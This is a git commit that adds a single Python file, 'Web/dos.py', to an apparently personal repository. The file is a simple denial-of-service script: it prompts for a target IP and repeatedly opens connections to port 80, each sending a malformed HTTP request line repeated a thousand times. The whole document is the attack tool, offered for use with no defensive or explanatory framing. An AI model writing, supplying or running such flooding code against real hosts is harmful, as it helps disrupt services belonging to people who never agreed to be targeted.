a332f8255daf1822c010576adc04f59abf4db35b
Walid <85395652+WalidMakdoud@users.noreply.github.com>
2023-11-22 13:09:24 -0800

    Add files via upload

---
+++ Web/dos.py
@@ -0,0 +1,12 @@
+#!/usr/bin/env/python3
+#By WalidMakdoud
+import socket
+
+target = input("Enter target ip: ")
+
+for i in range(1,100):
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((target,80))
+    data = b"GET / HTTP 1.1\r\n"*1000
+    s.send(data)
+    s.close()
